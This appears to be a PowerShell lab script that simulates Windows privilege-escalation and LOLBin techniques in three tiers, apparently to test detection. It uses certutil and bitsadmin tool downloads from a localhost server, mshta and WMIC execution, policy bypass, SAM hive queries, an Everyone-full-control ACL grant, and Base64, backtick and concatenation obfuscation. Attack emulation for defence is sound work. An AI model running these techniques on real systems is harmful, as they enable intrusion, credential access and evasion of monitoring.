<#
==============================================================================
SCRIPT: privesc_lolbins_attacks.ps1
PURPOSE: Windows PrivEsc & LOLBins Attack Simulation across Complexity Tiers

[SAFETY NOTICE & WORKSPACE INVARIANT]:
DO NOT EXECUTE DIRECTLY ON HOST MACHINES.
THIS SCRIPT IS STRICTLY AN ARTIFACT INTENDED FOR EXPORT AND EXECUTION INSIDE
AN ISOLATED, NON-NETWORKED WINDOWS LAB VIRTUAL MACHINE UNDER FULL RESEARCHER CONTROL.

TARGETED LOLBINS (Grounding: Barr-Smith et al. 2021 [Survivalism]):
  1. powershell.exe (Script Execution / Bypass)
  2. certutil.exe (Ingress Tool Transfer - urlcache)
  3. mshta.exe (Inline scriptlet execution)
  4. rundll32.exe (Proxy execution)
  5. regsvr32.exe (Squiblydoo scriptlet execution)
  6. wmic.exe (Process call create)
  7. bitsadmin.exe (Download job transfer)
  8. sc.exe (Unquoted service path / binPath hijack)

COMPLEXITY TIERS:
  - Tier 1: Overt / Isolated single-command LOLBin execution
  - Tier 2: Multi-step Chained sequences (Springer 2026 sliding window)
  - Tier 3: Obfuscated / Stealthy (Base64 -e, backtick insertion, format operators)
==============================================================================
#>

Write-Host "======================================================================"
Write-Host " [!] CAUTION: WINDOWS PRIVILEGE ESCALATION & LOLBIN LAB SIMULATOR"
Write-Host " [!] Isolated Lab VM Target Only."
Write-Host "======================================================================"

$TempDir = "$env:TEMP\PrivEscLab"
New-Item -ItemType Directory -Path $TempDir -Force | Out-Null

# ------------------------------------------------------------------------------
# TIER 1: OVERT / ISOLATED LOLBIN INVOCATIONS
# ------------------------------------------------------------------------------
Write-Host "[*] Executing Tier 1: Overt LOLBin Invocations..."

# T1.1 Certutil Ingress Tool Transfer (T1105)
certutil.exe -urlcache -split -f http://127.0.0.1:8000/payload.exe "$TempDir\payload.exe" 2>$null

# T1.2 BITSAdmin Background Download (T1197)
bitsadmin.exe /transfer testJob /download /priority normal http://127.0.0.1:8000/test.bin "$TempDir\test.bin" 2>$null

# T1.3 WMIC Process Spawning (T1047)
wmic.exe process call create "cmd.exe /c echo Tier1 WMIC Process Triggered" 2>$null

# T1.4 Mshta Scriptlet Execution (T1218.005)
# Using benign close loop so no persistent window hangs
mshta.exe vbscript:Close(Execute("CreateObject(""Wscript.Shell"").Run(""cmd.exe /c echo [Tier1] Mshta"",0)")) 2>$null

# T1.5 PowerShell Bypass Execution (T1059.001)
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Write-Host '[Tier1] PowerShell Bypass Executed'"

# T1.6 Token Privilege Enumeration (T1033)
whoami.exe /priv

# ------------------------------------------------------------------------------
# TIER 2: MULTI-STEP CHAINED SEQUENCES (Springer 2026)
# ------------------------------------------------------------------------------
Write-Host "[*] Executing Tier 2: Chained Attack Sequences..."

# Chain 1: Reconnaissance -> Ingress Transfer -> Privileged Hive Touch
cmd.exe /c whoami.exe /priv
cmd.exe /c net.exe user
cmd.exe /c certutil.exe -urlcache -split -f http://127.0.0.1:8000/mim.exe "$TempDir\m.exe" 2>$null
# Simulating access without damaging host
cmd.exe /c reg.exe query HKLM\SAM 2>$null

# Chain 2: Service Enumeration -> ACL Check -> Service Configuration Check
cmd.exe /c "wmic service get name,displayname,pathname,startmode | findstr /i Auto" 2>$null
cmd.exe /c icacls.exe "$TempDir" /grant Everyone:F 2>$null
cmd.exe /c sc.exe qc LanmanServer 2>$null

# ------------------------------------------------------------------------------
# TIER 3: OBFUSCATED & STEALTHY LOLBINS (SLR 2026 Anomaly Degradation Test)
# ------------------------------------------------------------------------------
Write-Host "[*] Executing Tier 3: Obfuscated LOLBin Invocations..."

# T3.1 Base64 Encoded PowerShell Command (-e flag)
# Command encoded: Write-Host "[Tier3] Obfuscated Base64 PowerShell"
$B64 = "VwByAGkAdABlAC0ASABvAHMAdAAgACIAWwBUAGkAZQByADMAXQAgAE8AYgBmAHUAcwBjAGEAdABlAGQAIABCAGEAcwBlADYANAAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIgA="
powershell.exe -NoProfile -NonInteractive -EncodedCommand $B64

# T3.2 PowerShell Backtick Character Obfuscation
p`o`w`e`r`s`h`e`l`l.e`x`e -NoP -NonI -c "Write-Host '[Tier3] Backtick Obfuscation Executed'"

# T3.3 PowerShell Format Operator Concatenation
powershell.exe -c "& (('{1}{0}'-f'Host','Write-')+' ''[Tier3] Format Operator Concatenation''')"

# T3.4 Environment Variable Concatenation for LOLBin Execution
cmd.exe /c "set a=cert&& set b=util&& call %a%%b% -urlcache -split -f http://127.0.0.1:8000/x.dll ""$TempDir\x.dll""" 2>$null

Write-Host "[+] Tier 1, 2, and 3 Windows LOLBin simulations completed."
